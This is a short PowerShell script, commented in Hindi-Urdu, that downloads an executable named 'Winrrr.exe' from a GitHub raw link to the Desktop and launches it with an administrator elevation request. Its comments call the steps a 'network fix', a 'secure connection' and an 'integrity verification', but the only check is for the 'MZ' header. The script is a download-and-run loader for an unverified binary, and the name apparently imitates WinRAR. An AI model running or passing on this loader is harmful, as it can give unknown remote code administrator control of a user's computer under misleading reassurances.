# 1. System-Wide Network Layer Fix (TLS 1.2 Configuration)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 2. Local Paths aur Targets Definition
$desktopPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Desktop"), "Winrrr.exe")
$url = "https://github.com/afnan-altaf/winrrr/raw/refs/heads/main/Winrrr.exe"

try {
    Write-Host "[INFO] Secure connection built. Downloading file..." -ForegroundColor Cyan
    
    # 3. Standard Web Request Method
    Invoke-WebRequest -Uri $url -OutFile $desktopPath -UseBasicParsing
    
    # 4. Binary Integrity Verification (Check if valid Windows format)
    $fileContent = Get-Content -Path $desktopPath -TotalCount 1 -Encoding Ascii
    if ($fileContent -notmatch "^MZ") {
        throw "Downloaded file valid Windows binary (.EXE) nahi hai. Link ya repository status verify karein."
    }
    
    Write-Host "[SUCCESS] File Desktop par save ho chuki hai." -ForegroundColor Green

    # 5. Standard Process Trigger with UAC Elevation Request
    Write-Host "[INFO] User Account Control (UAC) prompt trigger ho raha hai..." -ForegroundColor Cyan
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $desktopPath
    $psi.Verb = "runas"  # Standard Windows Administration Prompt Request
    $psi.UseShellExecute = $true
    [System.Diagnostics.Process]::Start($psi) | Out-Null
    
    Write-Host "[SUCCESS] Application launch execution forward kar di gayi hai." -ForegroundColor Green
}
catch {
    Write-Host "[ERROR] Process ruk gaya hai: $_" -ForegroundColor Red
    
    # Clean up corrupted file if any
    if (Test-Path $desktopPath) { Remove-Item $desktopPath -Force }
}
